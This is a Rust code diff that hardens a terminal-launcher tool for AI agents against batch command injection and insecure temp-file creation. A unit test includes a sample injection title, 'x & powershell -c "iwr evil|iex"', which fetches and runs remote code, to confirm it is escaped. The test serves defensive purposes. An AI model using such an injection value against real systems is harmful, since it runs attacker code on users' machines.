@@ -98,7 +98,7 @@ pub fn windows_command_line(spec: &CommandSpec) -> String {
 /// The .cmd script run by `cmd /k`. UTF-8 code page so non-ASCII paths survive.
 pub fn windows_script(spec: &CommandSpec, title: &str) -> String {
     let mut lines = vec!["@echo off".to_string(), "chcp 65001 >nul".to_string()];
-    lines.push(format!("title {}", sanitize_title(title).replace('%', "%%")));
+    lines.push(format!("title {}", batch_title(title)));
     for (k, v) in env_sorted(spec) {
         let v = v.as_deref().unwrap_or("").replace('%', "%%").replace('"', "");
         lines.push(format!("set \"{k}={v}\""));
@@ -139,6 +139,23 @@ pub fn windows_terminal_argv(use_wt: bool, script: &Path, title: &str, cwd: Opti
 /// Titles travel through wt's own parser where `;` separates commands.
 fn sanitize_title(t: &str) -> String {
     t.chars().filter(|c| !matches!(c, '"' | ';' | '\r' | '\n')).collect()
+}
+
+/// The title for an unquoted `title` line in a batch file: `%` doubled and `^ & | < >` escaped
+/// with `^`, so a label like "R&D" is shown as written instead of starting a command.
+fn batch_title(t: &str) -> String {
+    let mut out = String::new();
+    for c in sanitize_title(t).chars() {
+        match c {
+            '%' => out.push_str("%%"),
+            '^' | '&' | '|' | '<' | '>' => {
+                out.push('^');
+                out.push(c);
+            }
+            _ => out.push(c),
+        }
+    }
+    out
 }
 
 // ---------- macOS / Linux ----------
@@ -200,9 +217,21 @@ pub fn linux_terminal_argv(terminal: &str, script: &Path) -> Vec<String> {
 
 // ---------- process spawning ----------
 
+/// The temp folder is per user on macOS and Windows. On Linux it is the shared /tmp, where
+/// another user could get there first, so scripts go in the user's runtime (or cache) folder.
 fn scripts_dir() -> anyhow::Result<PathBuf> {
+    #[cfg(all(unix, not(target_os = "macos")))]
+    let dir = dirs::runtime_dir().or_else(dirs::cache_dir).context("no folder of your own for launch scripts")?.join("agent-hub");
+    #[cfg(not(all(unix, not(target_os = "macos"))))]
     let dir = std::env::temp_dir().join("switchyard");
-    std::fs::create_dir_all(&dir)?;
+    let mut builder = std::fs::DirBuilder::new();
+    builder.recursive(true);
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::DirBuilderExt;
+        builder.mode(0o700);
+    }
+    builder.create(&dir)?;
     cleanup_old_scripts(&dir);
     Ok(dir)
 }
@@ -220,13 +249,17 @@ fn cleanup_old_scripts(dir: &Path) {
 }
 
 fn write_script(ext: &str, content: &str) -> anyhow::Result<PathBuf> {
+    use std::io::Write;
     let path = scripts_dir()?.join(format!("launch-{}.{ext}", uuid::Uuid::new_v4().simple()));
-    std::fs::write(&path, content).with_context(|| format!("writing {}", path.display()))?;
+    let mut opts = std::fs::OpenOptions::new();
+    opts.write(true).create_new(true);
+    // Private and executable from the start, never readable by others in between.
     #[cfg(unix)]
     {
-        use std::os::unix::fs::PermissionsExt;
-        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o700))?;
+        use std::os::unix::fs::OpenOptionsExt;
+        opts.mode(0o700);
     }
+    opts.open(&path).and_then(|mut f| f.write_all(content.as_bytes())).with_context(|| format!("writing {}", path.display()))?;
     Ok(path)
 }
 
@@ -369,6 +402,13 @@ mod tests {
         assert!(s.contains(r#"cd /d "C:\src\my app""#));
         assert!(s.contains(r#"call "C:\Program Files\Claude\claude.exe" --continue "fix 100%%%% & ship""#));
         assert!(s.contains("title Work Max (Claude)"));
+    }
+
+    #[test]
+    fn windows_title_line_cannot_run_commands() {
+        assert_eq!(batch_title("R&D > x | y < z ^ 100%"), "R^&D ^> x ^| y ^< z ^^ 100%%");
+        let s = windows_script(&spec(), "x & powershell -c \"iwr evil|iex\" (Claude)");
+        assert!(s.contains("\r\ntitle x ^& powershell -c iwr evil^|iex (Claude)\r\n"), "{s}");
     }
 
     #[test]
